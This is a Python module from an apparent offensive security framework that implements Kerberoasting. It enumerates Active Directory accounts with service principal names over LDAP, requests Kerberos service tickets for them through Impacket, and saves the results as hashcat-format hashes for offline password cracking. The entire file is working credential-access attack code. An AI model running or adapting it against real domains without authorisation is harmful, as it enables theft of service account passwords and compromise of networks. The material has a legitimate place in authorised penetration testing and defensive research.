"""Kerberoasting capability (Impacket-backed, hashcat format)."""

from __future__ import annotations

import json
from typing import Any

from rich.console import Console

from adaf_attack.core.auth import describe_auth, get_kerberos_tgt
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.roast_format import format_tgs_hashcat
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="kerberoast",
    summary="Request TGS tickets for SPN-enabled accounts (Kerberoasting)",
    category="credential-access",
    tags=("kerberos", "tgs", "spn"),
)
class Kerberoast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        try:
            from impacket.krb5 import constants
            from impacket.krb5.kerberosv5 import getKerberosTGS
            from impacket.krb5.types import Principal
        except ImportError as exc:
            raise RuntimeError(
                "Kerberoasting requires Impacket. Install with: pip install 'adaf-attack[kerberos]'"
            ) from exc

        if not target.has_credentials:
            raise RuntimeError(
                "Kerberoasting requires credentials "
                "(--username + password/hashes/aes-key, or -k/--ccache)"
            )

        console.print(f"[bold]Kerberoast[/bold] → {target.domain} @ {target.dc_ip}")
        console.print(f"[dim]Auth: {describe_auth(target)}[/dim]")

        conn, base_dn, _config = ldap_connect(target)
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
            search_scope=__import__("ldap3").SUBTREE,
            attributes=["sAMAccountName", "servicePrincipalName", "userAccountControl"],
        )

        targets = []
        for entry in conn.entries:
            sam = str(entry.sAMAccountName)
            spns = [str(s) for s in (entry.servicePrincipalName or [])]
            if spns:
                targets.append({"sam": sam, "spns": spns})
                user_id = f"USER@{sam.upper()}@{target.domain.upper()}"
                graph.add_node(user_id, "User", sam=sam, spns=spns)
                for spn in spns:
                    graph.add_edge(user_id, user_id, "HasSPN", spn=spn)

        conn.unbind()
        console.print(f"Found [cyan]{len(targets)}[/cyan] SPN-enabled accounts")

        tgt, cipher, _old, session_key = get_kerberos_tgt(target)

        roasted = []
        hash_lines: list[str] = []

        for t in targets:
            sam = t["sam"]
            spn = t["spns"][0]
            try:
                spn_principal = Principal(
                    spn, type=constants.PrincipalNameType.NT_SRV_INST.value
                )
                tgs, cipher, _old, session_key = getKerberosTGS(
                    spn_principal,
                    target.domain.upper(),
                    target.dc_ip,
                    tgt,
                    cipher,
                    session_key,
                )

                hashcat_line = format_tgs_hashcat(tgs, sam, target.domain, spn)
                entry: dict[str, Any] = {
                    "account": sam,
                    "spn": spn,
                    "format": "hashcat-13100" if hashcat_line else "impacket-raw",
                }
                if hashcat_line:
                    entry["hash"] = hashcat_line
                    hash_lines.append(hashcat_line)
                else:
                    entry["ticket"] = str(tgs)
                    entry["note"] = "Could not build hashcat line; raw ticket kept"

                roasted.append(entry)
                console.print(f"  [green]✓[/green] {sam}  ({spn})")
            except Exception as exc:  # noqa: BLE001
                console.print(f"  [red]✗[/red] {sam}  ({exc})")
                roasted.append({"account": sam, "spn": spn, "error": str(exc)})

        result = {
            "domain": target.domain,
            "count": len(roasted),
            "tickets": roasted,
        }

        redacted = redact(result, include_secrets=include_secrets)
        out_path = session.path("kerberoast.json")
        out_path.write_text(json.dumps(redacted, indent=2, default=str))

        if include_secrets and hash_lines:
            hashes_path = session.path("kerberoast.hashes.txt")
            hashes_path.write_text("\n".join(hash_lines) + "\n")
            console.print(f"Hashcat file → {hashes_path}")

        graph.save(session.path("graph.json"))
        session.log("kerberoast.complete", count=len(roasted), include_secrets=include_secrets)
        console.print(f"Results → {out_path}")
        if not include_secrets:
            console.print("[dim]Hashes redacted. Use --include-secrets to keep them.[/dim]")
        return redacted
